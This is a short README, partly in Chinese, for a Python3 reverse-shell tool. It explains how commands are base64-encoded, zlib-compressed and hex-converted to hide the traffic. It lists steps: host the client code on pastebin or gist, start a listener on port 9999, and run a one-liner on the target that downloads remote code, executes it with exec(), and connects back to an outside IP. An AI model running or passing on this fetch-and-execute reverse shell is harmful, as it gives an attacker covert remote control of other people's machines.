# PyReverseShell
Python3 Reverse Shell

Python3 反弹shell 走加密流量，先把命令base64后然后zlib压缩，在转换为16进制  
1. 将client.txt上传到pastebin或者gist  
2. 服务器上运行 python3 server.py  "0.0.0.0" 9999
3. python3 -c "import urllib.request,socket,base64,zlib,binascii,subprocess;data=urllib.request.urlopen('https://pastebin.com/raw/xxxxxxx').read();exec(data);client('1.1.1.1',9999)"
